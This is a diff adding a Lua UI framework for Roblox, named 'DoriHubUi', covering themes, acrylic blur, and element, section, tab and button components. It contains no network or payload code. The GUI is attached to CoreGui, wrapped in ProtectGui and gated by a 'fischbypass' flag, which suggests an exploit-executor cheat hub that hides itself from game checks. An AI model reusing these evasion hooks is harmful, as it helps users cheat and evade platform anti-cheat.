+function Creator.GetThemeProperty(Property)
+	local Theme = Creator.Themes[Creator.Theme]
+	if Theme then
+		return Theme[Property]
+	end
+	return Creator.Themes.Dark[Property]
+end
+
+function Creator.UpdateTheme()
+	if not Creator.Themes[Creator.Theme] then
+		Creator.Theme = "Dark"
+	end
+
+	for Instance, Object in next, Creator.Registry do
+		for Property, ColorIdx in next, Object.Properties do
+			local themeValue = Creator.GetThemeProperty(ColorIdx)
+			if themeValue then
+				Instance[Property] = themeValue
+			end
+		end
+	end
+
+	local transparency = Creator.GetThemeProperty("ElementTransparency")
+	if transparency then
+		for _, Motor in next, Creator.TransparencyMotors do
+			Motor:setGoal(Flipper.Instant.new(transparency))
+		end
+	end
+end
+
+function Creator.AddThemeObject(Object, Properties)
+	local Idx = #Creator.Registry + 1
+	local Data = {
+		Object = Object,
+		Properties = Properties,
+		Idx = Idx,
+	}
+
+	Creator.Registry[Object] = Data
+	Creator.UpdateTheme()
+	return Object
+end
+
+function Creator.OverrideTag(Object, Properties)
+	Creator.Registry[Object].Properties = Properties
+	Creator.UpdateTheme()
+end
+
+function Creator.GetThemeProperty(Property)
+	if Themes[Library.Theme][Property] then
+		return Themes[Library.Theme][Property]
+	end
+	return Themes["Dark"][Property]
+end
+function Creator.New(Name, Properties, Children)
+	local Object = Instance.new(Name)
+
+	for Name, Value in next, Creator.DefaultProperties[Name] or {} do
+		Object[Name] = Value
+	end
+
+
+	for Name, Value in next, Properties or {} do
+		if Name ~= "ThemeTag" then
+			Object[Name] = Value
+		end
+	end
+
+
+	for _, Child in next, Children or {} do
+		Child.Parent = Object
+	end
+
+	ApplyCustomProps(Object, Properties)
+	return Object
+end
+
+function Creator.SpringMotor(Initial, Instance, Prop, IgnoreDialogCheck, ResetOnThemeChange)
+	IgnoreDialogCheck = IgnoreDialogCheck or false
+	ResetOnThemeChange = ResetOnThemeChange or false
+	local Motor = Flipper.SingleMotor.new(Initial)
+	Motor:onStep(function(value)
+		Instance[Prop] = value
+	end)
+
+	if ResetOnThemeChange then
+		table.insert(Creator.TransparencyMotors, Motor)
+	end
+
+	local function SetValue(Value, Ignore)
+		Ignore = Ignore or false
+		if not IgnoreDialogCheck then
+			if not Ignore then
+				if Prop == "BackgroundTransparency" and Library.DialogOpen then
+					return
+				end
+			end
+		end
+		Motor:setGoal(Flipper.Spring.new(Value, { frequency = 8 }))
+	end
+
+	return Motor, SetValue
+end
+
+Library.Creator = Creator
+
+local New = Creator.New
+
+local GUI = New("ScreenGui", {
+	Parent = game:GetService("CoreGui"), -- luôn tồn tại, không reset
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling, -- giữ layer riêng
+	DisplayOrder = 999999, -- cao nhất có thể
+	IgnoreGuiInset = true, -- bỏ topbar offset Roblox
+	Name = "DoriHubUi", -- đặt tên rõ ràng (có thể tuỳ chỉnh)
+})
+Library.GUI = GUI
+ProtectGui(GUI)
+
+function Library:SafeCallback(Function, ...)
+	if not Function then
+		return
+	end
+
+	local Success, Event = pcall(Function, ...)
+	if not Success then
+		local _, i = Event:find(":%d+: ")
+
+		if not i then
+			return Library:Notify({
+				Title = "Interface",
+				Content = "Callback error",
+				SubContent = Event,
+				Duration = 5,
+			})
+		end
+
+		return Library:Notify({
+			Title = "Interface",
+			Content = "Callback error",
+			SubContent = Event:sub(i + 1),
+			Duration = 5,
+		})
+	end
+end--?
+function Library:Round(Number, Factor)
+	if Factor == 0 then
+		return math.floor(Number)
+	end
+	Number = tostring(Number)
+	return Number:find("%.") and tonumber(Number:sub(1, Number:find("%.") + Factor)) or Number
+end
+
+local function map(value, inMin, inMax, outMin, outMax)
+	return (value - inMin) * (outMax - outMin) / (inMax - inMin) + outMin
+end
+
+local function viewportPointToWorld(location, distance)
+	local unitRay = game:GetService("Workspace").CurrentCamera:ScreenPointToRay(location.X, location.Y)
+	return unitRay.Origin + unitRay.Direction * distance
+end
+
+local function getOffset()
+	local viewportSizeY = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+	return map(viewportSizeY, 0, 2560, 8, 56)
+end
+
+local viewportPointToWorld, getOffset = unpack({ viewportPointToWorld, getOffset })
+
+local BlurFolder = Instance.new("Folder", game:GetService("Workspace").CurrentCamera)
+
+local function createAcrylic()
+	local Part = Creator.New("Part", {
+		Name = "Body",
+		Color = Color3.new(0, 0, 0),
+		Material = Enum.Material.Glass,
+		Size = Vector3.new(1, 1, 0),
+		Anchored = true,
+		CanCollide = false,
+		Locked = true,
+		CastShadow = false,
+		Transparency = 0.95,
+	}, {
+		Creator.New("SpecialMesh", {
+			MeshType = Enum.MeshType.Brick,
+			Offset = Vector3.new(0, 0, -0.000001),
+		}),
+	})
+
+	return Part
+end
+
+function AcrylicBlur()
+	local function createAcrylicBlur(distance)
+		local cleanups = {}
+
+		distance = distance or 0.001
+		local positions = {
+			topLeft = Vector2.new(),
+			topRight = Vector2.new(),
+			bottomRight = Vector2.new(),
+		}
+		local model = createAcrylic()
+		model.Parent = BlurFolder
+
+		local function updatePositions(size, position)
+			positions.topLeft = position
+			positions.topRight = position + Vector2.new(size.X, 0)
+			positions.bottomRight = position + size
+		end
+
+		local function render()
+			local res = game:GetService("Workspace").CurrentCamera
+			if res then
+				res = res.CFrame
+			end
+			local cond = res
+			if not cond then
+				cond = CFrame.new()
+			end
+
+			local camera = cond
+			local topLeft = positions.topLeft
+			local topRight = positions.topRight
+			local bottomRight = positions.bottomRight
+
+			local topLeft3D = viewportPointToWorld(topLeft, distance)
+			local topRight3D = viewportPointToWorld(topRight, distance)
+			local bottomRight3D = viewportPointToWorld(bottomRight, distance)
+
+			local width = (topRight3D - topLeft3D).Magnitude
+			local height = (topRight3D - bottomRight3D).Magnitude
+
+			model.CFrame =
+				CFrame.fromMatrix((topLeft3D + bottomRight3D) / 2, camera.XVector, camera.YVector, camera.ZVector)
+			model.Mesh.Scale = Vector3.new(width, height, 0)
+		end
+
+		local function onChange(rbx)
+			local offset = getOffset()
+			local size = rbx.AbsoluteSize - Vector2.new(offset, offset)
+			local position = rbx.AbsolutePosition + Vector2.new(offset / 2, offset / 2)
+
+			updatePositions(size, position)
+			task.spawn(render)
+		end
+
+		local function renderOnChange()
+			local camera = game:GetService("Workspace").CurrentCamera
+			if not camera then
+				return
+			end
+
+			table.insert(cleanups, camera:GetPropertyChangedSignal("CFrame"):Connect(render))
+			table.insert(cleanups, camera:GetPropertyChangedSignal("ViewportSize"):Connect(render))
+			table.insert(cleanups, camera:GetPropertyChangedSignal("FieldOfView"):Connect(render))
+			task.spawn(render)
+		end
+
+		model.Destroying:Connect(function()
+			for _, item in cleanups do
+				pcall(function()
+					item:Disconnect()
+				end)
+			end
+		end)
+
+		renderOnChange()
+
+		return onChange, model
+	end
+
+	return function(distance)
+		local Blur = {}
+		local onChange, model = createAcrylicBlur(distance)
+
+		local comp = Creator.New("Frame", {
+			BackgroundTransparency = 1,
+			Size = UDim2.fromScale(1, 1),
+		})
+
+		Creator.AddSignal(comp:GetPropertyChangedSignal("AbsolutePosition"), function()
+			onChange(comp)
+		end)
+
+		Creator.AddSignal(comp:GetPropertyChangedSignal("AbsoluteSize"), function()
+			onChange(comp)
+		end)
+
+		Blur.AddParent = function(Parent)
+			Creator.AddSignal(Parent:GetPropertyChangedSignal("Visible"), function()
+				Blur.SetVisibility(Parent.Visible)
+			end)
+		end
+
+		Blur.SetVisibility = function(Value)
+			model.Transparency = Value and 0.95 or 1
+		end
+
+		Blur.Frame = comp
+		Blur.Model = model
+
+		return Blur
+	end
+end
+
+function AcrylicPaint()
+	local New = Creator.New
+	local AcrylicBlur = AcrylicBlur()
+
+	return function(props)
+		local AcrylicPaint = {}
+
+		AcrylicPaint.Frame = New("Frame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 0.9,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BorderSizePixel = 0,
+		}, {
+			New("ImageLabel", {
+				Image = "rbxassetid://8992230677",
+				ScaleType = "Slice",
+				SliceCenter = Rect.new(Vector2.new(99, 99), Vector2.new(99, 99)),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				Size = UDim2.new(1, 120, 1, 116),
+				Position = UDim2.new(0.5, 0, 0.5, 0),
+				BackgroundTransparency = 1,
+				ImageColor3 = Color3.fromRGB(0, 0, 0),
+				ImageTransparency = 0.7,
+			}),
+
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 8),
+			}),
+
+			New("Frame", {
+				BackgroundTransparency = 0.45,
+				Size = UDim2.fromScale(1, 1),
+				Name = "Background",
+				ThemeTag = {
+					BackgroundColor3 = "AcrylicMain",
+				},
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 8),
+				}),
+			}),
+
+			New("Frame", {
+				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+				BackgroundTransparency = 0.4,
+				Size = UDim2.fromScale(1, 1),
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 8),
+				}),
+
+				New("UIGradient", {
+					Rotation = 90,
+					ThemeTag = {
+						Color = "AcrylicGradient",
+					},
+				}),
+			}),
+
+			New("ImageLabel", {
+				Image = "rbxassetid://9968344105",
+				ImageTransparency = 0.98,
+				ScaleType = Enum.ScaleType.Tile,
+				TileSize = UDim2.new(0, 128, 0, 128),
+				Size = UDim2.fromScale(1, 1),
+				BackgroundTransparency = 1,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 8),
+				}),
+			}),
+
+			New("ImageLabel", {
+				Image = "rbxassetid://9968344227",
+				ImageTransparency = 0.9,
+				ScaleType = Enum.ScaleType.Tile,
+				TileSize = UDim2.new(0, 128, 0, 128),
+				Size = UDim2.fromScale(1, 1),
+				BackgroundTransparency = 1,
+				ThemeTag = {
+					ImageTransparency = "AcrylicNoise",
+				},
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 8),
+				}),
+			}),
+
+			New("Frame", {
+				BackgroundTransparency = 1,
+				Size = UDim2.fromScale(1, 1),
+				ZIndex = 2,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 8),
+				}),
+				New("UIStroke", {
+					Transparency = 0.5,
+					Thickness = 1,
+					ThemeTag = {
+						Color = "AcrylicBorder",
+					},
+				}),
+			}),
+		})
+
+		local Blur
+
+		if Library.UseAcrylic then
+			Blur = AcrylicBlur()
+			Blur.Frame.Parent = AcrylicPaint.Frame
+			AcrylicPaint.Model = Blur.Model
+			AcrylicPaint.AddParent = Blur.AddParent
+			AcrylicPaint.SetVisibility = Blur.SetVisibility
+		end
+
+		return AcrylicPaint
+	end
+end
+
+local Acrylic = {
+	AcrylicBlur = AcrylicBlur(),
+	CreateAcrylic = createAcrylic,
+	AcrylicPaint = AcrylicPaint(),
+}
+
+function Acrylic.init()
+	local depthOfFieldDefaults = {}
+
+	function Acrylic.Enable()
+	-- 1
+	end
+
+	function Acrylic.Disable()
+	-- 2
+	end
+
+end
+
+local Components = {
+	Assets = {
+		Close = "rbxassetid://9886659671",
+		Min = "rbxassetid://9886659276",
+		Max = "rbxassetid://9886659406",
+		Restore = "rbxassetid://9886659001",
+	},
+}
+
+Components.Element = (function()
+	local New = Creator.New
+
+	local Spring = Flipper.Spring.new
+
+	return function(Title, Desc, Parent, Hover, Options)
+		local Element = {}
+		local Options = Options or {}
+
+		Element.TitleLabel = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal),
+			Text = Title,
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 13,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Size = UDim2.new(1, 0, 0, 14),
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			LayoutOrder = 2,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		Element.Header = New("Frame", {
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 0, 14),
+		}, {
+			New("UIListLayout", {
+				Padding = UDim.new(0, 5),
+				FillDirection = Enum.FillDirection.Horizontal,
+				SortOrder = Enum.SortOrder.LayoutOrder,
+				VerticalAlignment = Enum.VerticalAlignment.Center,
+			}),
+		})
+
+		if Options and Options.Icon then
+			local iconImage = Options.Icon
+			pcall(function()
+				if Library and Library.GetIcon then
+					local resolved = Library:GetIcon(Options.Icon)
+					if resolved then iconImage = resolved end
+				end
+			end)
+			Element.IconImage = New("ImageLabel", {
+				Image = iconImage,
+				Size = UDim2.fromOffset(16, 16),
+				BackgroundTransparency = 1,
+				LayoutOrder = 1,
+				ThemeTag = {
+					ImageColor3 = "Text",
+				},
+			})
+			Element.IconImage.Parent = Element.Header
+		end
+
+		Element.TitleLabel.Parent = Element.Header
+
+		Element.DescLabel = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			Text = Desc,
+			TextColor3 = Color3.fromRGB(200, 200, 200),
+			TextSize = 12,
+			TextWrapped = true,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 0, 14),
+			ThemeTag = {
+				TextColor3 = "SubText",
+			},
+		})
+
+		Element.LabelHolder = New("Frame", {
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			Position = UDim2.fromOffset(10, 0),
+			Size = UDim2.new(1, -28, 0, 0),
+		}, {
+			New("UIListLayout", {
+				SortOrder = Enum.SortOrder.LayoutOrder,
+				VerticalAlignment = Enum.VerticalAlignment.Center,
+			}),
+			New("UIPadding", {
+				PaddingBottom = UDim.new(0, 13),
+				PaddingTop = UDim.new(0, 13),
+			}),
+			Element.Header,
+			Element.DescLabel,
+		})
+
+		Element.Border = New("UIStroke", {
+			Transparency = 0.5,
+			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+			Color = Color3.fromRGB(0, 0, 0),
+			ThemeTag = {
+				Color = "ElementBorder",
+			},
+		})
+
+		Element.Frame = New("TextButton", {
+			Visible = Options.Visible and Options.Visible or true,
+			Size = UDim2.new(1, 0, 0, 0),
+			BackgroundTransparency = 0.89,
+			BackgroundColor3 = Color3.fromRGB(130, 130, 130),
+			Parent = Parent,
+			AutomaticSize = Enum.AutomaticSize.Y,
+			Text = "",
+			LayoutOrder = 7,
+			ThemeTag = {
+				BackgroundColor3 = "Element",
+				BackgroundTransparency = "ElementTransparency",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+			Element.Border,
+			Element.LabelHolder,
+		})
+
+		function Element:SetTitle(Set)
+			Element.TitleLabel.Text = Set
+			local hasTitle = (Set ~= nil and Set ~= "")
+			Element.Header.Visible = hasTitle
+
+			if not hasTitle then
+				if Element.IconImage then
+					if not Element.DescRow then
+						Element.DescRow = New("Frame", {
+							AutomaticSize = Enum.AutomaticSize.Y,
+							BackgroundTransparency = 1,
+							Size = UDim2.new(1, 0, 0, 14),
+							LayoutOrder = 2,
+						}, {
+							New("UIListLayout", {
+								Padding = UDim.new(0, 5),
+								FillDirection = Enum.FillDirection.Horizontal,
+								SortOrder = Enum.SortOrder.LayoutOrder,
+								VerticalAlignment = Enum.VerticalAlignment.Center,
+							}),
+						})
+						Element.DescRow.Parent = Element.LabelHolder
+					end
+
+					if not Element.DescIconImage then
+						Element.DescIconImage = New("ImageLabel", {
+							Image = Element.IconImage.Image,
+							Size = UDim2.fromOffset(16, 16),
+							BackgroundTransparency = 1,
+							LayoutOrder = 1,
+							ThemeTag = {
+								ImageColor3 = "Text",
+							},
+						})
+						Element.DescIconImage.Parent = Element.DescRow
+					else
+						Element.DescIconImage.Image = Element.IconImage.Image
+						Element.DescIconImage.Parent = Element.DescRow
+					end
+
+					Element.DescLabel.Parent = Element.DescRow
+					Element.DescLabel.LayoutOrder = 2
+					Element.DescLabel.Size = UDim2.new(1, -24, 0, 14)
+				else
+					if Element.DescRow then
+						Element.DescRow:Destroy()
+						Element.DescRow = nil
+						Element.DescIconImage = nil
+					end
+					Element.DescLabel.Parent = Element.LabelHolder
+					Element.DescLabel.LayoutOrder = 2
+					Element.DescLabel.Size = UDim2.new(1, 0, 0, 14)
+				end
+			else
+				if Element.DescRow then
+					Element.DescRow:Destroy()
+					Element.DescRow = nil
+					Element.DescIconImage = nil
+				end
+				Element.DescLabel.Parent = Element.LabelHolder
+				Element.DescLabel.LayoutOrder = 2
+				Element.DescLabel.Size = UDim2.new(1, 0, 0, 14)
+			end
+			if Library.Windows and #Library.Windows > 0 then
+				local currentWindow = Library.Windows[#Library.Windows]
+				if currentWindow and currentWindow.AllElements and currentWindow.AllElements[Element.Frame] then
+					currentWindow.AllElements[Element.Frame].title = Set
+				end
+			end
+		end
+
+		function Element:Visible(Bool)
+			Element.Frame.Visible = Bool
+		end
+
+		function Element:SetDesc(Set)
+			if Set == nil then
+				Set = ""
+			end
+			if Set == "" then
+				Element.DescLabel.Visible = false
+			else
+				Element.DescLabel.Visible = true
+			end
+			Element.DescLabel.Text = Set
+			if Library.Windows and #Library.Windows > 0 then
+				local currentWindow = Library.Windows[#Library.Windows]
+				if currentWindow and currentWindow.AllElements and currentWindow.AllElements[Element.Frame] then
+					currentWindow.AllElements[Element.Frame].description = Set
+				end
+			end
+		end
+
+		function Element:GetTitle()
+			return Element.TitleLabel.Text
+		end
+
+		function Element:GetDesc()
+			return Element.DescLabel.Text
+		end
+
+		function Element:Destroy()
+			Element.Frame:Destroy()
+		end
+
+		Element.Header.Visible = not (Title == nil or Title == "")
+
+		Element:SetTitle(Title or "")
+		Element:SetDesc(Desc)
+
+
+		if Library.Windows and #Library.Windows > 0 then
+			local currentWindow = Library.Windows[#Library.Windows]
+			if currentWindow and currentWindow.RegisterElement then
+				currentWindow.RegisterElement(Element.Frame, Title, "Element", Desc)
+			end
+		end
+
+		if Hover then
+			local Themes = Library.Themes
+			local Motor, SetTransparency = Creator.SpringMotor(
+				Creator.GetThemeProperty("ElementTransparency"),
+				Element.Frame,
+				"BackgroundTransparency",
+				false,
+				true
+			)
+
+			Creator.AddSignal(Element.Frame.MouseEnter, function()
+				SetTransparency(Creator.GetThemeProperty("ElementTransparency") - Creator.GetThemeProperty("HoverChange"))
+			end)
+			Creator.AddSignal(Element.Frame.MouseLeave, function()
+				SetTransparency(Creator.GetThemeProperty("ElementTransparency"))
+			end)
+			Creator.AddSignal(Element.Frame.MouseButton1Down, function()
+				SetTransparency(Creator.GetThemeProperty("ElementTransparency") + Creator.GetThemeProperty("HoverChange"))
+			end)
+			Creator.AddSignal(Element.Frame.MouseButton1Up, function()
+				SetTransparency(Creator.GetThemeProperty("ElementTransparency") - Creator.GetThemeProperty("HoverChange"))
+			end)
+		end
+
+		return Element
+	end
+end)()
+Components.Section = (function()
+	local New = Creator.New
+
+	return function(Title, Parent, Icon)
+		local Section = {}
+
+		Section.Layout = New("UIListLayout", {
+			Padding = UDim.new(0, 5),
+		})
+
+		Section.Container = New("Frame", {
+			Size = UDim2.new(1, 0, 0, 26),
+			Position = UDim2.fromOffset(0, 24),
+			BackgroundTransparency = 1,
+		}, {
+			Section.Layout,
+		})
+
+		local SectionHeader = New("Frame", {
+			Size = UDim2.new(1, -16, 0, 18),
+			Position = UDim2.fromOffset(0, 2),
+			BackgroundTransparency = 1,
+		}, {
+			New("UIListLayout", {
+				Padding = UDim.new(0, 5),
+				FillDirection = Enum.FillDirection.Horizontal,
+				SortOrder = Enum.SortOrder.LayoutOrder,
+				VerticalAlignment = Enum.VerticalAlignment.Center,
+			}),
+			Icon and New("ImageLabel", {
+				Image = Icon,
+				Size = UDim2.fromOffset(16, 16),
+				BackgroundTransparency = 1,
+				LayoutOrder = 1,
+				ThemeTag = {
+					ImageColor3 = "Text",
+				},
+			}) or nil,
+			New("TextLabel", {
+				RichText = true,
+				Text = Title,
+				TextTransparency = 0,
+				FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
+				TextSize = 18,
+				TextXAlignment = "Left",
+				TextYAlignment = "Center",
+				Size = UDim2.fromScale(0, 1),
+				AutomaticSize = Enum.AutomaticSize.X,
+				BackgroundTransparency = 1,
+				LayoutOrder = 2,
+				ThemeTag = {
+					TextColor3 = "Text",
+				},
+			}),
+		})
+
+		Section.Root = New("Frame", {
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 0, 26),
+			LayoutOrder = 7,
+			Parent = Parent,
+		}, {
+			SectionHeader,
+			Section.Container,
+		})
+
+		Creator.AddSignal(Section.Layout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+			Section.Container.Size = UDim2.new(1, 0, 0, Section.Layout.AbsoluteContentSize.Y)
+			Section.Root.Size = UDim2.new(1, 0, 0, Section.Layout.AbsoluteContentSize.Y + 25)
+		end)
+
+
+		if Library.Windows and #Library.Windows > 0 then
+			local currentWindow = Library.Windows[#Library.Windows]
+			if currentWindow and currentWindow.RegisterElement then
+				currentWindow.RegisterElement(Section.Root, Title, "Section")
+			end
+		end
+
+		return Section
+	end
+end)()
+Components.Tab = (function()
+	local New = Creator.New
+	local Spring = Flipper.Spring.new
+	local Instant = Flipper.Instant.new
+	local Components = Components
+
+	local TabModule = {
+		Window = nil,
+		Tabs = {},
+		Containers = {},
+		SelectedTab = 0,
+		TabCount = 0,
+	}
+
+	function TabModule:Init(Window)
+		TabModule.Window = Window
+		return TabModule
+	end
+
+	function TabModule:GetCurrentTabPos()
+		local TabHolderPos = TabModule.Window.TabHolder.AbsolutePosition.Y
+		local TabPos = TabModule.Tabs[TabModule.SelectedTab].Frame.AbsolutePosition.Y
+
+		return TabPos - TabHolderPos
+	end
+
+	function TabModule:New(Title, Icon, Parent)
+		local Window = TabModule.Window
+		local Elements = Library.Elements
+
+		TabModule.TabCount = TabModule.TabCount + 1
+		local TabIndex = TabModule.TabCount
+
+		local Tab = {
+			Selected = false,
+			Name = Title,
+			Type = "Tab",
+		}
+
+		if not fischbypass then 
+			if Library:GetIcon(Icon) then
+				Icon = Library:GetIcon(Icon)
+			end
+
+			if Icon == "" or nil then
+				Icon = nil
+			end
+		end
+
+		Tab.Frame = New("TextButton", {
+			Size = UDim2.new(1, 0, 0, 34),
+			BackgroundTransparency = 1,
+			Parent = Parent,
+			ThemeTag = {
+				BackgroundColor3 = "Tab",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 6),
+			}),
+			New("TextLabel", {
+				AnchorPoint = Vector2.new(0, 0.5),
+				Position = not fischbypass and Icon and UDim2.new(0, 30, 0.5, 0) or UDim2.new(0, 12, 0.5, 0),
+				Text = Title,
+				RichText = true,
+				TextColor3 = Color3.fromRGB(255, 255, 255),
+				TextTransparency = 0,
+				FontFace = Font.new(
+					"rbxasset://fonts/families/GothamSSm.json",
+					Enum.FontWeight.Regular,
+					Enum.FontStyle.Normal
+				),
+				TextSize = 12,
+				TextXAlignment = "Left",
+				TextYAlignment = "Center",
+				Size = UDim2.new(1, -12, 1, 0),
+				BackgroundTransparency = 1,
+				ThemeTag = {
+					TextColor3 = "Text",
+				},
+			}),
+			New("ImageLabel", {
+				AnchorPoint = Vector2.new(0, 0.5),
+				Size = UDim2.fromOffset(16, 16),
+				Position = UDim2.new(0, 8, 0.5, 0),
+				BackgroundTransparency = 1,
+				Image = Icon and Icon or nil,
+				ThemeTag = {
+					ImageColor3 = "Text",
+				},
+			}),
+		})
+
+		local ContainerLayout = New("UIListLayout", {
+			Padding = UDim.new(0, 5),
+			SortOrder = Enum.SortOrder.LayoutOrder,
+		})
+
+		Tab.ContainerFrame = New("ScrollingFrame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 1,
+			Parent = Window.ContainerHolder,
+			Visible = false,
+			BottomImage = "rbxassetid://6889812791",
+			MidImage = "rbxassetid://6889812721",
+			TopImage = "rbxassetid://6276641225",
+			ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255),
+			ScrollBarImageTransparency = 0.95,
+			ScrollBarThickness = 3,
+			BorderSizePixel = 0,
+			CanvasSize = UDim2.fromScale(0, 0),
+			ScrollingDirection = Enum.ScrollingDirection.Y,
+			ScrollingEnabled = true,
+		}, {
+			ContainerLayout,
+			New("UIPadding", {
+				PaddingRight = UDim.new(0, 10),
+				PaddingLeft = UDim.new(0, 1),
+				PaddingTop = UDim.new(0, 1),
+				PaddingBottom = UDim.new(0, 1),
+			}),
+		})
+
+		Creator.AddSignal(ContainerLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+			Tab.ContainerFrame.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y + 2)
+		end)
+
+		Tab.Motor, Tab.SetTransparency = Creator.SpringMotor(1, Tab.Frame, "BackgroundTransparency")
+
+		Creator.AddSignal(Tab.Frame.MouseEnter, function()
+			Tab.SetTransparency(Tab.Selected and 0.85 or 0.89)
+		end)
+		Creator.AddSignal(Tab.Frame.MouseLeave, function()
+			Tab.SetTransparency(Tab.Selected and 0.89 or 1)
+		end)
+		Creator.AddSignal(Tab.Frame.MouseButton1Down, function()
+			Tab.SetTransparency(0.92)
+		end)
+		Creator.AddSignal(Tab.Frame.MouseButton1Up, function()
+			Tab.SetTransparency(Tab.Selected and 0.85 or 0.89)
+		end)
+		Creator.AddSignal(Tab.Frame.MouseButton1Click, function()
+			TabModule:SelectTab(TabIndex)
+		end)
+
+		TabModule.Containers[TabIndex] = Tab.ContainerFrame
+		TabModule.Tabs[TabIndex] = Tab
+
+		Tab.Container = Tab.ContainerFrame
+		Tab.ScrollFrame = Tab.Container
+
+		function Tab:AddSection(SectionTitle, SectionIcon)
+			local Section = { Type = "Section" }
+
+			local Icon = SectionIcon
+			if not fischbypass then 
+				if Library:GetIcon(Icon) then
+					Icon = Library:GetIcon(Icon)
+				end
+
+				if Icon == "" or nil then
+					Icon = nil
+				end
+			end
+
+			local SectionFrame = Components.Section(SectionTitle, Tab.Container, Icon)
+			Section.Container = SectionFrame.Container
+			Section.ScrollFrame = Tab.Container
+
+			setmetatable(Section, Elements)
+			return Section
+		end
+
+		setmetatable(Tab, Elements)
+		return Tab
+	end
+
+	function TabModule:SelectTab(Tab)
+		local Window = TabModule.Window
+
+		TabModule.SelectedTab = Tab
+
+		for _, TabObject in next, TabModule.Tabs do
+			TabObject.SetTransparency(1)
+			TabObject.Selected = false
+		end
+		TabModule.Tabs[Tab].SetTransparency(0.89)
+		TabModule.Tabs[Tab].Selected = true
+
+		Window.TabDisplay.Text = TabModule.Tabs[Tab].Name
+		Window.SelectorPosMotor:setGoal(Spring(TabModule:GetCurrentTabPos(), { frequency = 6 }))
+
+		task.spawn(function()
+			Window.ContainerHolder.Parent = Window.ContainerAnim
+
+			Window.ContainerPosMotor:setGoal(Spring(15, { frequency = 10 }))
+			Window.ContainerBackMotor:setGoal(Spring(1, { frequency = 10 }))
+			task.wait(0.12)
+			for _, Container in next, TabModule.Containers do
+				Container.Visible = false
+			end
+			TabModule.Containers[Tab].Visible = true
+			Window.ContainerPosMotor:setGoal(Spring(0, { frequency = 5 }))
+			Window.ContainerBackMotor:setGoal(Spring(0, { frequency = 8 }))
+			task.wait(0.12)
+			Window.ContainerHolder.Parent = Window.ContainerCanvas
+		end)
+	end
+
+	return TabModule
+end)()
+Components.Button = (function()
+	local New = Creator.New
+
+	local Spring = Flipper.Spring.new
+
+	return function(Theme, Parent, DialogCheck)
+		DialogCheck = DialogCheck or false
+		local Button = {}
+
+		Button.Title = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			TextColor3 = Color3.fromRGB(200, 200, 200),
+			TextSize = 14,
+			TextWrapped = true,
+			TextXAlignment = Enum.TextXAlignment.Center,
+			TextYAlignment = Enum.TextYAlignment.Center,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundTransparency = 1,
+			Size = UDim2.fromScale(1, 1),
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		Button.HoverFrame = New("Frame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				BackgroundColor3 = "Hover",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+		})
+
+		Button.Frame = New("TextButton", {
+			Size = UDim2.new(0, 0, 0, 32),
+			Parent = Parent,
+			ThemeTag = {
+				BackgroundColor3 = "DialogButton",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				Transparency = 0.65,
+				ThemeTag = {
+					Color = "DialogButtonBorder",
+				},
+			}),
+			Button.HoverFrame,
+			Button.Title,
+		})
+		local Motor, SetTransparency = Creator.SpringMotor(1, Button.HoverFrame, "BackgroundTransparency", DialogCheck)
+		Creator.AddSignal(Button.Frame.MouseEnter, function()
+			SetTransparency(0.97)
+		end)
+		Creator.AddSignal(Button.Frame.MouseLeave, function()
+			SetTransparency(1)
+		end)
+		Creator.AddSignal(Button.Frame.MouseButton1Down, function()
+			SetTransparency(1)
+		end)
+		Creator.AddSignal(Button.Frame.MouseButton1Up, function()
+			SetTransparency(0.97)
+		end)
+
+		return Button
+	end
+end)()
+Components.Dialog = (function()
+	local Spring = Flipper.Spring.new
+	local Instant = Flipper.Instant.new
+	local New = Creator.New
+
+	local Dialog = {
+		Window = nil,
